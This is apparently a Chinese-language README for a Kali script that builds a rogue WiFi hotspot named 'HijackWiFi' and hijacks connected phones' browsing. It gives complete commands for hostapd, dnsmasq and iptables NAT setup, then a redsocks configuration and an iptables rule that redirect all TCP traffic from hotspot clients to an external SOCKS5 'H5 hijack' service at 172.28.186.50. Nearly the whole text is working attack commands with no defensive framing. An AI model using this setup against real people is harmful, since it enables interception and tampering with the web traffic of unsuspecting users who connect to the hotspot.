## 脚本使用教程

```bash
#开启热点
bash main.sh start
#关闭热点
bash main.sh stop
```

## Kali从WiFi热点到H5劫持教程

### 创建WiFi热点

#### 安装hostapd、dnsmasq、iptables

```shell
apt install -y hostapd dnsmasq iptables
```

#### 初始化hostapd配置文件

```shell
cat > /etc/hostapd/hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=HijackWiFi
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=1
wpa=2
wpa_passphrase=88888888
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

#### 初始化hostapd默认读取的配置文件路径

```shell
cat > /etc/default/hostapd << EOF
DAEMON_CONF="/etc/hostapd/hostapd.conf"
EOF
```

#### 初始化dnsmasq配置文件

```shell
cat > /etc/dnsmasq.conf <<EOF
interface=wlan0
dhcp-range=192.168.50.10,192.168.50.100,12h
EOF
```

#### 给无线网卡分配IP

```shell
ip addr add 192.168.50.1/24 dev wlan0
ip link set wlan0 up
```

#### 开启端口转发配置

```shell
cat >> /etc/sysctl.conf << EOF
net.ipv4.ip_forward=1
EOF
```

#### 开启iptables转发配置

```shell
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
```

#### 启动热点服务

```shell
systemctl restart dnsmasq
#debug调试用这个
hostapd /etc/hostapd/hostapd.conf
#后台启动用这个
systemctl restart hostapd
```

#### 上网验证

使用手机连接wifi打开浏览器查看是否可用正常访问网页，访问成功则说明配置正常

### 转发流量到H5劫持服务

#### 安装redsocks

```shell
apt install -y redsocks
```

#### 创建redsocks配置转发http(s)流量

```shell
cat > redsocks.conf << EOF
base {
    log_info = on;
    log = "stderr";
    daemon = off;
    redirector = iptables;
}

redsocks {
    local_ip = 0.0.0.0;
    local_port = 8084;
    ip = 172.28.186.50;
    port = 8084;
    type = socks5;
}
EOF
```

#### 启动redsocks监听转发

```shell
redsocks -c redsocks.conf
```

#### 将HTTP(S)流量重定向到redsocks

```shell
iptables -t nat -A PREROUTING -i wlan0 -p tcp -j REDIRECT --to-port 8084
```

